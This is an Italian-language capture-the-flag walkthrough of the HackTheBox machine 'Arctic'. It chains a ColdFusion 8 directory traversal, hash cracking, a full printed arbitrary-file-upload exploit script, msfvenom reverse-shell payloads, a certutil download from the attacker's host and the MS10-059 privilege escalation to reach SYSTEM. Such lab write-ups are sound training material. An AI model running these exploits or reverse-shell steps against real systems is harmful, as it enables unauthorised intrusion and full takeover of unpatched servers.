# Artic

**Target: 10.10.10.11**

## INFORMATION GAHTERING

Iniziamo con un scan \[\[Nmap]] standard per verdere quali porte sono aparte e quali servizi girano

```bash
┌──(root㉿kali)-[/home/kali/htb/artic]
└─# nmap -sC -sV -O 10.10.10.11                     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 16:59 EDT
Nmap scan report for 10.10.10.11
Host is up (0.047s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 148.32 seconds
```

Un altro scan su tutte le porte e in UDP non rileva ulteriori porte

```bash
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC

OS Windows 2008 R2
```

## ENUMERATION

Visitando la pagina 10.10.10.11:8500 ci sono delle directory esposte

CFIDE/ dir 03/22/17 08:52 μμ cfdocs/ dir 03/22/17 08:55 μμ

L'elaborazione della richiesta ci mette 30 sec difficile enumerazione con script automatici

![index](<../zzz\_rev/attachments/1z6PpwH4sApbhWYCqYsiPIQ (1).webp>)

Cliccando sulla cartella administrator veniamo reindirizzati ad una pagina di login di AdobeCouldfuison 8

![imag1](../zzz\_rev/attachments/1-Ym437MPB5fWWHtqgKnmaw.webp)

Cerchiamo con searchsploit

```bash
┌──(root㉿kali)-[/home/kali/htb/artic]
└─# searchsploit --id adobe coldfusion
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  EDB-ID
---------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                               | 36067
Adobe ColdFusion - Directory Traversal                                            | 14641
Adobe ColdFusion - Directory Traversal (Metasploit)                               | 16985
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE | 50781
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code | 43993
Adobe ColdFusion 2018 - Arbitrary File Upload                                     | 45979
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                 | 29567
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                | 36172
Adobe ColdFusion 8 - Remote Command Execution (RCE)                               | 50057
Adobe ColdFusion 9 - Administrative Authentication Bypass                         | 27755
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)            | 30210
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                   | 40346
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)         | 24946
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Sit | 33170
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Que | 33167
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String | 33169
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow'  | 33168
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Dopo aver esaminato gli exploit, due di loro spiccano:

* 14641 — Directory Traversal. Lo useremo per ottenere la password dell'amministratore.
* 45979 — Arbitrary File Upload. Lo useremo per ottenere una shell inversa sulla macchina di destinazione.

## GAINING AN INITIAL FOOTHOLD

Diamo un'occhiata al codice dell'exploit 14641. http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en

In realtà non dobbiamo eseguire il file exploit. Invece, potremmo semplicemente navigare verso l'URL sopra per visualizzare il contenuto del file `password.properties`.

![imag2](../zzz\_rev/attachments/11WRx1zCNkyVb\_qfEHcQYiA.webp) password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03

l'hash sembra essere un SHA1 proviamo ad darlo in impasto a john per rompere l'hash

```bash
┌──(root㉿kali)-[/home/kali/htb/artic]
└─# john hash.txt --format=raw-sha1 -wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
happyday         (?)     
1g 0:00:00:00 DONE (2023-05-15 01:56) 33.33g/s 170666p/s 170666c/s 170666C/s jodie..babygrl
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 
```

Ci loggiamo con admin:happyday e siamo dentro

![image4](../zzz\_rev/attachments/artic4.png)

> NOTA: APPROFONDIRE PASS THE HASH

### METODO CON AUTENFICAZIONE ADMIN

Una volta avuto l'accesso al prompt dell'admin addiamo al sezione "SERVER SETTING MAPPING" e prendiamo nota dalla directory path di /CFID nel nostro caso

C:\ColdFusion8\wwwroot\CFIDE

Prepariamo un payload come segue

```bash
┌──(root㉿kali)-[/home/kali/htb/artic]
└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.53 LPORT=4444 -f raw > shell.jsp 
```

Ci spostiamo nella sezione "DEBUGGING & LOGGING > ADD/EDIT SCHEDULED TASK e aggiungiamo un nuovo schedule

![imag3](<../zzz\_rev/attachments/1HqvdBk09BVtq1448nzEWFA (1).webp>)

![imag4](../zzz\_rev/attachments/artic5.png)

alla voce Url mettiamo il nostro ip http://10.10.14.53:80/shell.jsp

alla voce file mettiamo la path salvata in precenza C:\ColdFusion8\wwwroot\CFIDE

Salviamo, ci mettimo in ascolto con nc

```bash
┌──(root㉿kali)-[/home/kali/htb/optimun]
└─# nc -lnvp 4444
listening on [any] 4444 ...
```

Nella nostra directory dove abbiamo il payload tiriamo su un server per poter scaricare il paylod dalla macchina target

```bash
┌──(root㉿kali)-[/home/kali/htb/artic]
└─# python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

lanciamo il task salvato precendetemnte e otteniamo una shell

```bash
┌──(root㉿kali)-[/home/kali/htb/optimun]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.53] from (UNKNOWN) [10.10.10.11] 51613
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>
```

### METODO SENZA AUTENTIFICAZIONE ADMIN

Creiamo una payload .jsp con il seguente comando:

```bash
┌──(root㉿kali)-[/home/kali/htb/artic]
└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.53 LPORT=4444 -f raw > shell2.jsp
Payload size: 1497 bytes
```

Attaraverso questo script riusiamo a caricare il payload creato in precenza https://forum.hackthebox.com/t/python-coldfusion-8-0-1-arbitrary-file-upload/108

```bash
#!/usr/bin/python
# Exploit Title: ColdFusion 8.0.1 - Arbitrary File Upload
# Date: 2017-10-16
# Exploit Author: Alexander Reid
# Vendor Homepage: http://www.adobe.com/products/coldfusion-family.html
# Version: ColdFusion 8.0.1
# CVE: CVE-2009-2265 
# 
# Description: 
# A standalone proof of concept that demonstrates an arbitrary file upload vulnerability in ColdFusion 8.0.1
# Uploads the specified jsp file to the remote server.
#
# Usage: ./exploit.py <target ip> <target port> [/path/to/coldfusion] </path/to/payload.jsp>
# Example: ./exploit.py 127.0.0.1 8500 /home/arrexel/shell.jsp
import requests, sys

try:
    ip = sys.argv[1]
    port = sys.argv[2]
    if len(sys.argv) == 5:
        path = sys.argv[3]
        with open(sys.argv[4], 'r') as payload:
            body=payload.read()
    else:
        path = ""
        with open(sys.argv[3], 'r') as payload:
            body=payload.read()
except IndexError:
    print 'Usage: ./exploit.py <target ip/hostname> <target port> [/path/to/coldfusion] </path/to/payload.jsp>'
    print 'Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp'
    sys.exit(-1)

basepath = "http://" + ip + ":" + port + path

print 'Sending payload...'

try:
    req = requests.post(basepath + "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/exploit.jsp%00", files={'newfile': ('exploit.txt', body, 'application/x-java-archive')}, timeout=30)
    if req.status_code == 200:
        print 'Successfully uploaded payload!\nFind it at ' + basepath + '/userfiles/file/exploit.jsp'
    else:
        print 'Failed to upload payload... ' + str(req.status_code) + ' ' + req.reason
except requests.Timeout:
    print 'Failed to upload payload... Request timed out'
```

Dove abbiamo il payload tiriamo su un sever per poterlo scaricare dalla macchina target

```bash
┌──(root㉿kali)-[/home/kali/htb/artic]
└─# python -m http.server 80                                                               
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Con il seguente comando carichiamo il payload sulla macchina target

```bash
┌──(root㉿kali)-[/home/kali/htb/artic]
└─# python2 arb-file-exploit.py 10.10.10.11 8500 shell.jsp 
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Sending payload...
Successfully uploaded payload!
Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp
```

Ci mettiamo in ascolto con nc

```
┌──(root㉿kali)-[/home/kali/htb/optimun]
└─# nc -lnvp 4444
listening on [any] 4444 ...
```

Richiamiamo il payload al indirizzo ce ci ha fornito lo script del RCE Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp

Otteniamo cosi una shell

```bash
┌──(root㉿kali)-[/home/kali/htb/optimun]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.53] from (UNKNOWN) [10.10.10.11] 51613
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin> 
```

## PRIVESC

Scopriamao di più sul sistema e ci salviamo l'output in un file txt:

```cmd
C:\Users\tolis\Desktop>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 
System Boot Time:          16/5/2023, 7:55:06 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 5.003 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.187 MB
Virtual Memory: In Use:    1.098 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11

C:\Users\tolis\Desktop>
```

Ottime notizie monta Windows 8 e non ci sono patch Con windows-exploit-suggester.py facciao un check delle vulnerabilità disponibili

```bash
┌──(root㉿kali)-[/home/kali/htb/artic]
└─# cp /home/kali/tool/PrivEsc/Windows-Exploit-Suggester/windows-exploit-suggester.py .

┌──(root㉿kali)-[/home/kali/htb/artic]
└─# python2 windows-exploit-suggester.py --update         
[*] initiating winsploit version 3.3...
[+] writing to file 2023-05-15-mssb.xls
[*] done

┌──(root㉿kali)-[/home/kali/htb/artic]
└─# python2 windows-exploit-suggester.py --database 2023-05-15-mssb.xls --systeminfo systeminfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

### MS10-059

Troiviamo al seguente indirizo l'eseguibile pre compilato https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe

lo scarichiamo e tiriamo su un server python per poterlo scaricare nella macchina target:

```
┌──(root㉿kali)-[/home/kali/htb/artic]
└─# python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Dalla macchina target lo scarichiamo con certuli :

```cmd
C:\Users\tolis\Desktop>certutil -urlcache -split -f "http://10.10.14.53:8000/MS10-059.exe" MS10-059.exe
certutil -urlcache -split -f "http://10.10.14.53:8000/MS10-059.exe" MS10-059.exe
****  Online  ****
  000000  ...
  0bf800
CertUtil: -URLCache command completed successfully.
```

Ci mettiamo in ascolto con nc sulla nostra macchina:

```bash
┌──(root㉿kali)-[/home/kali/htb/artic]
└─# nc -lnvp 80  
listening on [any] 80 ...
```

lanciamo l'exploit come segue:

```cmd
C:\Users\tolis\Desktop>MS10-059.exe 10.10.14.53 80
```

Otteniamo cosi un shell con massimi privlegi:

```bash
┌──(root㉿kali)-[/home/kali/htb/artic]
└─# nc -lnvp 80  
listening on [any] 80 ...
connect to [10.10.14.53] from (UNKNOWN) [10.10.10.11] 52776
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\tolis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\Users\tolis\Desktop

17/05/2023  04:37     <DIR>          .
17/05/2023  04:37     <DIR>          ..
17/05/2023  04:35            141.861 Blob0_0.key
17/05/2023  04:35            141.861 Chimicurri.exe
17/05/2023  04:37            784.384 MS10-059.exe
17/05/2023  01:52                 34 user.txt
               4 File(s)      1.068.140 bytes
               2 Dir(s)   1.422.209.024 bytes free

C:\Users\tolis\Desktop>whoami
whoami
nt authority\system
```

Otteniamo cosi la root flag

```cmd
C:\Users\Administrator\Desktop>type root.txt
type root.txt
e115a6702820830309afd31a4751c872
```

## LEZIONI IMPARATE:

Ciò che mi ha permesso di ottenere l'accesso iniziale alla macchina e di aumentare i privilegi è stato lo sfruttamento di vulnerabilità note che disponevano di patch. Quindi è ovvio che dovresti sempre aggiornare il tuo software!

* \[\[Directory Trasversal]]
* \[\[Pass the hash]]

La seconda cosa degna di nota è il modo in cui l'applicazione ha gestito le password. La password è stata prima sottoposta ad hashing utilizzando SHA1 e quindi crittograficamente utilizzando HMAC con un valore salt come chiave. Tutto questo è stato fatto sul lato client! Cosa significa lato client? Il client ha accesso a tutto (e può bypassarlo tutto)! Sono stato in grado di accedere all'account amministratore senza conoscere la password in chiaro. L'hashing delle password è un approccio comune per archiviare le password in modo sicuro. Se un'applicazione viene violata, l'attaccante dovrebbe affrontare il problema di decifrare le password con hash prima di ottenere l'accesso a qualsiasi credenziale utente. Tuttavia, se l'hashing viene eseguito sul lato client come apposto sul lato server, ciò equivarrebbe a memorizzare le password in testo normale! In qualità di utente malintenzionato, posso aggirare i controlli lato client e utilizzare il tuo hash per autenticare il tuo account. Pertanto, in questo caso, se accedo al file delle password non ho bisogno di eseguire un password cracker. Invece, posso semplicemente passare l'hash.
